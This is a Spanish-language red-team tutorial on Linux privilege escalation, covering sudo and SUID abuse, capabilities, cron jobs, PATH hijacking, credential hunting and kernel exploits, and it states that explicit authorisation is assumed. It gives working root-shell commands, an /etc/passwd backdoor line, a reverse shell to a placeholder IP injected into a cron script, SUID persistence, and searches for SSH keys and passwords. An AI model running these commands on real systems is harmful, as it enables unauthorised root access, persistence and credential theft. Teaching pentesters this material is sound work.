Privilege Escalation on Linux — SUID, cron jobs and capabilities

Privilege Escalation on Linux — SUID, cron jobs and capabilities

Red Team · Actualización del post del 05/08/2020

Situación: Tienes una shell de bajo privilegio en una máquina Linux. Y te preguntas ¿y ahora qué? Este post intenta cubrir la metodología sistemática de escalada de privilegios: desde la enumeración inicial hasta los vectores más explotados — SUID, sudo, cron jobs, capabilities y kernel exploits — con comandos reales y ejemplos prácticos.

📝 NOTA: Todas las técnicas de este post asumen que tienes autorización explícita sobre el sistema objetivo. Aplican a entornos de pentesting legítimo, CTFs y laboratorios propios con fines educativos. RECUERDA que la escalada de privilegios en sistemas ajenos sin permiso es ilegal.

La mentalidad de la escalada de privilegios

Conseguir el primer acceso (foothold) rara vez te da control total. Normalmente aterrizas como un usuario sin privilegios — www-data, un usuario de servicio, o una cuenta de bajo nivel. El objetivo de la escalada es pasar de ese acceso limitado a root, el control absoluto del sistema.

La escalada de privilegios en Linux se divide en dos grandes categorías:

  • Escalada vertical: pasar de un usuario sin privilegios a root (o a un usuario con más permisos).
  • Escalada horizontal: moverte lateralmente a otro usuario del mismo nivel, a menudo como paso intermedio.

La regla de oro: la enumeración lo es todo. El 90% del trabajo es encontrar el vector; explotarlo suele ser la parte fácil. Un atacante metódico que enumera bien siempre supera a uno que va lanzando exploits al azar.

Fase 1: Enumeración inicial

Antes de buscar vectores específicos, necesitas entender dónde estás. Estos son los comandos de orientación básica:

# ¿Quién soy y a qué grupos pertenezco?
id
whoami

# Información del sistema y versión del kernel
uname -a
cat /etc/os-release

# ¿Qué usuarios existen en el sistema?
cat /etc/passwd | cut -d: -f1

# ¿Qué usuarios tienen shell válida? (objetivos potenciales)
grep "sh$" /etc/passwd

# Variables de entorno (a veces contienen credenciales)
env

# ¿Qué hay en mi directorio actual y en /home?
ls -la
ls -la /home/*
💡 TIP: Lo primero que debes mirar siempre es sudo -l. Si tu usuario puede ejecutar algo como root sin contraseña, puede que tengas la escalada servida en bandeja antes incluso de empezar a enumerar.

Comprobaciones de red y procesos

# Procesos corriendo (busca servicios como root)
ps aux | grep root

# Puertos en escucha (servicios internos no expuestos)
netstat -tulpn 2>/dev/null
ss -tulpn

# Conexiones activas
netstat -antp 2>/dev/null

Fase 2: Enumeración automatizada

Hacer todo a mano es lento, pero sirve para aprender. Sin embargo, estas herramientas automatizan la búsqueda de vectores y resaltan lo interesante:

# LinPEAS — el estándar de oro, muy completo
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Si no hay salida a internet, sube el script y ejecútalo
wget http://TU_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# LinEnum — alternativa más light 
./LinEnum.sh -t

# pspy — monitoriza procesos sin privilegios de root
# (excelente para detectar cron jobs en ejecución)
./pspy64
⚠️ ADVERTENCIA: LinPEAS hace mucho ruido y deja rastro en logs. En un engagement real con Blue Team activo, ha yque considerar una enumeración manual selectiva en lugar de lanzar scripts que disparan todas las alarmas (eso si se quiere hacer como blackbox, si se tiene permiso de la organziación es mucho mas factible el LinPEAS -> el tiempo es oro).

Fase 3: Vectores de escalada

3.1 — sudo mal configurado

El primer sitio donde mirar. sudo -l muestra qué comandos puede ejecutar tu usuario como root:

sudo -l

Una salida típica se vería así:

Matching Defaults entries for www-data on victim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin

User www-data may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (ALL) /bin/bash

Cómo leer esto:

  • (root) NOPASSWD: /usr/bin/find → puedes ejecutar find como root sin contraseña. Vector directo de escalada vía GTFOBins.
  • (root) NOPASSWD: /usr/bin/vim → lo mismo con vim, otro binario clásico para abrir una shell de root.
  • (ALL) /bin/bash → puedes ejecutar bash como cualquier usuario (incluido root), aunque aquí sí pediría contraseña al no llevar NOPASSWD.

Si el resultado muestra binarios que puedes ejecutar como root, consulta GTFOBins para ver cómo abusar de ellos. Ejemplos clásicos:

# Si puedes ejecutar 'find' como root
sudo find . -exec /bin/sh \; -quit

# Si puedes ejecutar 'vim' como root
sudo vim -c ':!/bin/sh'

# Si puedes ejecutar 'less' como root
sudo less /etc/profile
# Dentro de less: !/bin/sh

# Si puedes ejecutar 'python' como root
sudo python3 -c 'import os; os.system("/bin/sh")'

# Si tienes sudo sobre TODO (ALL)
sudo su -
💡 TIP: GTFOBins es tu mejor amigo. Para CUALQUIER binario que aparezca en sudo -l o con SUID, búscalo en gtfobins.github.io — te dirá exactamente cómo convertirlo en una shell de root.

3.2 — Binarios SUID

El bit SUID (Set User ID) hace que un binario se ejecute con los permisos de su propietario, no del usuario que lo lanza. Si un binario propiedad de root tiene SUID y es explotable, obtienes ejecución como root:

# Buscar todos los binarios con bit SUID
find / -perm -4000 -type f 2>/dev/null

# Versión más detallada con permisos
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;

Compara la lista resultante con GTFOBins. Algunos ejemplos de explotación:

# find con SUID
find . -exec /bin/sh -p \; -quit

# bash con SUID (la -p preserva privilegios)
/bin/bash -p

# nmap (versiones antiguas en modo interactivo)
nmap --interactive
# luego: !sh

# cp con SUID — sobrescribir /etc/passwd
# Generar hash: openssl passwd -1 -salt abc password
echo 'root2:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
⚠️ ADVERTENCIA: Modificar /etc/passwd o /etc/shadow es destroyer y muy detectable. En un engagement real hay que priorizar métodos que no alteren archivos críticos del sistema.

3.3 — Capabilities

Las capabilities son permisos "granulares" que dan a un binario poderes específicos de root sin el SUID completo. Una capability mal asignada es tan peligrosa como un SUID:

# Listar binarios con capabilities
getcap -r / 2>/dev/null

# Capability peligrosa: cap_setuid
# Si python tiene cap_setuid+ep:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Si perl tiene cap_setuid+ep:
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

La capability cap_setuid es la más crítica — permite a un proceso cambiar su UID a 0 (root). Otras peligrosas: cap_dac_read_search (leer cualquier archivo), cap_sys_admin (casi root).

3.4 — Cron jobs

Las tareas programadas (cron) que corren como root y son escribibles por tu usuario son un vector clásico:

# Ver cron jobs del sistema
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Cron jobs de usuarios
crontab -l

# Monitorizar procesos en tiempo real para CAPTURAR crons
# (pspy es ideal porque no necesita root)
./pspy64

Si encuentras un script ejecutado por cron como root y puedes escribir en él, podrías inyectar tu payload:

# Si el script es escribible, añade una reverse shell
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' >> /ruta/script.sh

# O crea un SUID bash para escalada persistente
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /ruta/script.sh
# Espera a que el cron ejecute, luego:
/tmp/rootbash -p
💡 TIP: A veces el problema no es el script en sí, sino que el cron usa una ruta relativa o un PATH manipulable. Si el cron llama a un binario sin ruta absoluta, puede que puedas colocar un binario malicioso con ese nombre en un directorio del PATH.

3.5 — PATH hijacking

Si un script o binario SUID llama a otro comando sin especificar su ruta absoluta, puedes secuestrar el PATH para que ejecute tu versión:

# Imagina un binario SUID que ejecuta 'service' sin ruta completa
# Creas tu propio 'service' malicioso:
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# Antepones /tmp al PATH
export PATH=/tmp:$PATH

# Ejecutas el binario SUID vulnerable — usará TU 'service'
/ruta/binario_suid

3.6 — Archivos con credenciales

Las credenciales filtradas en archivos son sorprendentemente comunes (te asustarías cuando se realiza un forense y vemos esto con gente que se supone que debería de ser la primera en cumplir con las políticas de seguridad):

# Buscar contraseñas en archivos de configuración
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Archivos de historial (a veces contienen comandos con contraseñas)
cat ~/.bash_history
cat ~/.mysql_history

# Claves SSH privadas
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Archivos de backup y configuración
find / -name "*.bak" 2>/dev/null
find / -name "config.php" 2>/dev/null

3.7 — Kernel exploits

Como último recurso (son inestables y pueden hacer tumbar el sistema casi for sure 100% real no fake), un kernel desactualizado puede tener exploits públicos:

# Identificar versión exacta del kernel
uname -r

# Buscar exploits conocidos
searchsploit linux kernel 5.4

# Herramienta que sugiere exploits según el kernel
./linux-exploit-suggester.sh
⚠️ ADVERTENCIA: Los kernel exploits pueden causar kernel panics y tumbar la máquina. Úsalos solo cuando todos los demás vectores fallen, y nunca en producción sin avisar al cliente. En un engagement real pueden costarte la confianza si tiras un servidor crítico y tumbas la operatividad de un cliente.

Fase 4: Estabilizar y persistir

Una vez que tienes root, estabiliza el acceso:

# Confirmar que eres root
id
# uid=0(root) gid=0(root)

# Si llegaste con un binario SUID, lanza una shell completa
/tmp/rootbash -p

# Mejorar una shell limitada a TTY completa
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

En un engagement, se debe documentar cómo llegaste a root con capturas y los comandos exactos, a veces incluso se solicita por parte del cliente, un bolcado del history. El informe es tan importante como el acceso.

Checklist resumen

Cuando estemos delante de una máquina Linux, repasa esta lista en orden (cada uno puede hacerse su lista propia, esta es de jemplo:

  • id y sudo -l — comprobación rápida de privilegios
  • uname -a — versión del kernel
  • find / -perm -4000 2>/dev/null — binarios SUID
  • getcap -r / 2>/dev/null — capabilities
  • cat /etc/crontab + pspy — tareas programadas
  • Buscar credenciales en config, historial y backups
  • Claves SSH y archivos sensibles
  • LinPEAS para una pasada automatizada completa
  • Kernel exploits como último recurso
